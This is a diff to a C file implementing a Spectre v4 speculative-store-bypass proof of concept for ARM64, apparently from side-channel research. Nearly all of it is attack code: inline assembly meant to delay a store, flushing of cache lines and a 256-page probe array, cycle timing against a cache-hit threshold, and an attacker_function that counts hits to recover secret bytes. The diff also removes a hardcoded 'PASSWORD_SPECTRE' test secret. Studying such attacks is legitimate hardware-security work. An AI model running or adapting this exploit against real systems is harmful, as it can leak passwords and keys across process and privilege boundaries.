@@ -6,7 +6,7 @@
 #include "utils.h"
 
 #define LEN 16
-#define MAX_TRIES 200
+#define MAX_TRIES 2000
 #define CACHE_HIT_THRESHOLD 190
 #define REPEAT_16(x) x x x x x x x x x x x x x x x x
 #define REPEAT_10(x) x x x x x x x x x x 
@@ -30,15 +30,14 @@
 
 
 
-unsigned char** memory_slot_ptr[256] __attribute__((aligned(4096)));
-unsigned char* memory_slot[256] __attribute__((aligned(4096)));
 unsigned char memory[100];
-static unsigned char cache_miss = 0;
-unsigned char secret_key[] = "PASSWORD_SPECTRE";
-unsigned char public_key[] = "################";
+unsigned char index2 = 8;
+unsigned char *miss;
+static unsigned char *miss_ptr1 __attribute__((aligned(4096)));
+static unsigned char **miss_ptr2 __attribute__((aligned(4096))) = &miss_ptr1;
+static unsigned char ***miss_ptr3 __attribute__((aligned(4096))) = &miss_ptr2;
+static unsigned char cache_miss = 8;
 unsigned char *password;
-unsigned char *dummy_buffer;
-static unsigned char  miss_index __attribute__((aligned(4096))) = 8;
 
 uint8_t *probe;
 volatile uint8_t tmp = 0;
@@ -77,21 +76,30 @@ static inline __attribute__((always_inline)) void measure_time() {
 static inline __attribute__((always_inline)) void spectre_v4(size_t idx) {
 	register uint64_t  access = 8;
 	register uint64_t  id = 8;
-	miss_index = 8;
+	double num = 0.0;
+//	unsigned char dummy = **miss_ptr3[0];
 	isb();
-	tmp = cache_miss;
-	asm volatile (
+//	tmp = cache_miss;
+//	memory[8] = 51;
+//	memory[**miss_ptr3[0]] = 8;
+	asm volatile(
+		"fcvtzs x2, d0\n\r"
+		"adds %[access], %[access], x2\n\r"
+		:[access] "+r" (access)
+		::"x2", "d0"
+	);
+	memory[access] = 8;
+//	asm volatile (
+//			"ldr d0, %[num]\n\r"
 //			"fdiv d0, d0, d1\n\r"
-			"fcvtzs x2, d0\n\r"
-			"mov x2, #0\n\r"
-			"add %[access], %[access], x2\n\r" 
-    		: [access] "+r" (access)        
-    		:                            
-    		: "x2", "d0"                      
-		);
-	memory[id] = 100;
-	EORS(100);
-	tmp = probe[memory[access] << 12];
+//			"fcvtzs x2, d0\n\r"
+//			"mov x2, #0\n\r"
+//			"adds %[access], %[access], x2\n\r" 
+//    		: [access] "+r" (access)        
+//    		:: "x2", "d0"                      
+//		);
+//	barrier();
+	tmp = probe[memory[8] << 12];
 }
 
 
@@ -103,13 +111,9 @@ static inline __attribute__((always_inline)) void attacker_function(int idx) {
 		volatile unsigned char pick = 0;
 		for (int tries = 0; tries < MAX_TRIES; tries++) {
 
-			memset(memory, 31, sizeof(uint64_t) * 10);
-			*memory_slot = secret_key;
-//			cacheflush(&cache_miss);
-//			cacheflush(memory_slot_ptr);
+			memset(memory, 51, sizeof(uint32_t) * 10);
 			cacheflush(&cache_miss);
-//			cacheflush(&miss_index);
-//			cacheflush(&index);
+			cacheflush(&index2);
 			for (int i = 0; i < 256; i++) {
 				cacheflush(&probe[i * 4096]);
 			}
@@ -128,7 +132,7 @@ static inline __attribute__((always_inline)) void attacker_function(int idx) {
 				uint64_t time2 = get_cycles() - time1; // read timer and compute elapsed time
 				isb();
 
-				if (time2 <= CACHE_HIT_THRESHOLD && access_index != 100){
+				if (time2 <= CACHE_HIT_THRESHOLD && access_index != 8){
 					results[access_index]++; // cache hit
 				}
 			}
@@ -147,17 +151,18 @@ static inline __attribute__((always_inline)) void attacker_function(int idx) {
 
 int main(void) {
 	probe = (unsigned char *)mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+	miss = (unsigned char *)mmap(0, 100, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
+	
 	memset(probe, 0, sizeof(uint8_t) * 256 * 4096);
-	dummy_buffer = (unsigned char *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-	memset(dummy_buffer, 0, 4096);
+	memset(miss, 8, sizeof(uint8_t) * 100);
 	password = (unsigned char *)malloc(sizeof(unsigned char) * LEN);
 //	for(int j = 0; j < 256; j++){
 //		memory_slot_ptr[j] = &memory_slot[j];
 //	}
 
-
+	miss_ptr1 = &miss[0];
 	int idx = 0;
-	REPEAT_16(
+	REPEAT_10(
 	attacker_function(idx);
 	idx ++;
 	)
